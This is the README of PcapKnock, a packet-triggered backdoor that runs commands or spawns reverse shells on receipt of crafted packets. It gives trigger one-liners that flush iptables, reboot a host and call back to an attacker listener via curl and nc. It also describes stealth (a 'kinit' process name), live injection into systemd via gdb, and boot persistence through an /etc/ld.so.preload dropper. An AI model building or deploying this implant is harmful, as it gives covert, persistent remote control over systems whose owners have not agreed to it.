PcapKnock
=========
PcapKnock listens for specially-crafted packets and either runs a command or
spawns a reverse shell based on the contents of the packets.  It is meant for
use as a PoC; there is no encryption or authentication.  It can either be built
as a standalone binary or an injectable library.

Tested on:
- OpenBSD
- FreeBSD (GhostOS)
- Linux (CentOS, Ubuntu)
- LXC on Centos (Debian)

For legal use only.

Building
--------
The [`build.sh`](./build.sh) script will try to produce binaries and shared
object files, but may well need tweaking.  On Linux, expect to have to wrestle
your distro's package manager.  On OpenBSD and FreeBSD, it just works.

The library and binaries will go into `built/$(uname -s)` in the source tree.
The built files are as follows:

Name                          | Purpose
------------------------------|--------
`pcapknock.standalone`        | "Normal" standalone binary.  Nohup it and run it in in the backgroud.
`pcapknock.standalone.daemon` | Standalone binary which forks itself into the background.
`pcapknock.standalone.debug`  | Standalone binary which prints debugging info.
`pcapknock.so`                | Injectable library
`pcapknock.injector`          | Injects pcapknocks.so into a process with in-memory GDB
`pcapknock.systemd.so`        | Systemd-specific [preloadable](#persistent-injection) library
`systemd_dropper.sh`          | Dropper which [preloads](#persistent-injection) vi `pcapknock.systemd.so` via `/etc/ld.so.preload`


Usage
-----
Once pcapknock is running as root, all that's required to trigger it is a
packet containing either a command to run surrounded by `COMMAND...COMMAND` or
an address to which to call back with a shell surrounded with
`CALLBACK...CALLBACK`.

Trigger examples:
```bash
# Drop the Linux firewall
echo 'iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -F' | nc -u <TARGET> 53

# Reboot a box
dig @target COMMANDrebootCOMMAND

# Call back on port 80
(sleep 1 && curl -sv -d 'CALLBACK<LOCALIP>:80CALLBACK' http://target) & nc -nvl 80
```

For either a callback or a command, a shell is spawned, disassociated from the
parent process, and run with the name (i.e. `argv[0]`) `kinit`.  The name may
be changed in [`config.h`](./config.h).

Configuration
-------------
Three compile-time preprocessor macros may be set when building to control
aspects of pcapknock's behavior.

Macro            | Effect
-----------------|-------
`DEBUG`          | Prints helpful debugging messages
`DAEMON`         | Causes the standalone binary builds to disassociate from the controlling terminal (What you probably want)
`PRELOADSYSTEMD` | Buid a library suitable for injection into systemd via `/etc/ld.so.preload`.

The compiled binaries and shared object files will have the above appended to
their names.

Further compile-time configuration can be performed by editing
[`config.h`](./config.h), but in general, this shouldn't be necessary.

There is no runtime configuration.

Linux Injection
---------------
On Linux, an few additional files are built for injecting into systemd either
on a running system or on boot vi `/etc/ld.so.preload`.

### Live Injection
The program `pcapknock.injector` loads `pcapknock.so` and gdb into memory and
uses gdb to shove pcapknock into another process which may be specified as the
first command-line argument, e.g. `./pcapknock.injector 23`.  Not specifying a
number or specifying an invalid number (like `./pcapknock.injector kittes`)
will inject into pid 1.  Turns out it works pretty well.

The injectee process should be have `libdl` loaded into it as well as have
permissions to sniff packets (e.g. open a packet socket).  Try a trigger before
getting rid of the access used to run `pcapknock.injector`.
`COMMANDtouch /tmpCOMMAND` works pretty well for testing.

When injecting there should be a line something like
```
$1 = (void *) 0x559ea705d3f0
```
which indicates (likely) success.  If the number on the right is 0, something's
gone wrong.

If injecting into init (which is the default if no pid is given) expect a lot
of lines in dmesg and to the console similar to the following:
```
kernel:systemd[1]: segfault at 7ffff81e3f5f ip 00007ffff81e3f5f sp 00007ffff81e3f50 error 15 
```
Apparently systemd is happy segfaulting.  A "better" description of systemd can
be found in https://amzn.com/B075DYXZW1.

### Persistent Injection
Using `/etc/ld.so.preload`, pcapknock can be loaded into systemd from boot by
pointing it at `pcapknock.systemd.so`.  The library will also be loaded into
every other process, but it only sniffs if it finds itself in the process with
pid 1.  A convenient dropper, `systemd_dropper.sh`, will write the library to
disk as '/usr/local/sbin/libpk.so.4` and add it to `/etc/ld.so.preload`.
